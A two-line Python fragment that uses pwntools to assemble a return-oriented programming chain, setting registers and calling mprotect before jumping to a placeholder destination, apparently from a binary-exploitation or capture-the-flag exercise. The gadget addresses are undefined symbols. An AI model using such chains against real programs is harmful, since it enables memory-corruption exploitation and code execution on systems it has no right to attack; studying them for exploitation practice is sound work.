from pwn import flat
chain = flat(POP_RSI_RET, 0x2000, POP_RDX_RET, 1, MPROTECT, DESTINATION)
